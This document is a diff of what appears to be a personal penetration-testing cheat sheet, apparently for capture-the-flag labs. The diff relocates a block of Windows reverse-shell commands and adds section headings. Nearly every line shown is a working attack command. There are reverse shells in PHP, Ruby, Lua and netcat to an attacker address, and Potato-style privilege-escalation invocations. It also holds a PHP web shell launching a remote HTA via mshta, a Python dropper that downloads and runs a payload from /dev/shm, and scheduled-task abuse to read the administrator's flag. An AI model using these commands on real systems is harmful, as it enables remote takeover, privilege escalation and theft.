@@ -296,14 +296,6 @@ php -r '$sock=fsockopen("$MYIP",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
 ruby -rsocket -e'f=TCPSocket.open("$MYIP",5555).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('$MYIP','5555');os.execute('/bin/sh -i <&3 >&3 2>&3');"
 
-+---------- Reverse ----------+
-C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd.exe
-C:\programdata\tmp\EfsPotato.exe "C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd"
-C:\programdata\tmp\FullPowers.exe -z -c "C:\programdata\tmp\EfsPotato.exe \"C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd\""
-C:\programdata\tmp\SigmaPotato.exe --revshell $MYIP 5555
-echo '<?php system('mshta http://$MYIP:8080/7qvnY13vrce.hta');?>' > shell.php
-echo -e 'import os\nos.popen("wget -qO /dev/shm/iZGYpy3w --no-check-certificate http://$MYIP:8080/11jUSgyiO5We7; chmod 777 /dev/shm/iZGYpy3w; /dev/shm/iZGYpy3w& disown")' > test.py
-
 +---------- Listeners ----------+
 python3 -m http.server 8888 -d ~/Upload
 rlwrap nc -lvnp 5555
@@ -706,12 +698,24 @@ reset
 
 ## Windows
 [*] Privilege Escalation
++---------- Installed Apps ----------+
 powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
+
++---------- Scheduled Tasks ----------+
 Get-ScheduledTask | Where-Object {($_.Author -notmatch "Microsoft") -and ($_.TaskPath -notmatch "Microsoft")} | Select-Object TaskName, TaskPath, State, Author
 $task = Get-ScheduledTask -TaskName "Ownership"; $task.Actions; $task.Triggers; $task.Settings; $task | Format-List *
 echo 'type C:\Users\Administrator\Desktop\root.txt > C:\Windows\win.log' > C:\Windows\SYSTEM.ps1
 Start-ScheduledTask -TaskName "Ownership"
 
++---------- Reverse Shells ----------+
+C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd.exe
+C:\programdata\tmp\EfsPotato.exe "C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd"
+C:\programdata\tmp\FullPowers.exe -z -c "C:\programdata\tmp\EfsPotato.exe \"C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd\""
+C:\programdata\tmp\SigmaPotato.exe --revshell $MYIP 5555
+echo '<?php system('mshta http://$MYIP:8080/7qvnY13vrce.hta');?>' > shell.php
+echo -e 'import os\nos.popen("wget -qO /dev/shm/iZGYpy3w --no-check-certificate http://$MYIP:8080/11jUSgyiO5We7; chmod 777 /dev/shm/iZGYpy3w; /dev/shm/iZGYpy3w& disown")' > test.py
+
++---------- System Enumeration ----------+
 dir C:\inetpub\wwwroot
 dir C:\xampp
 icacls C:\Windows\System32\Config
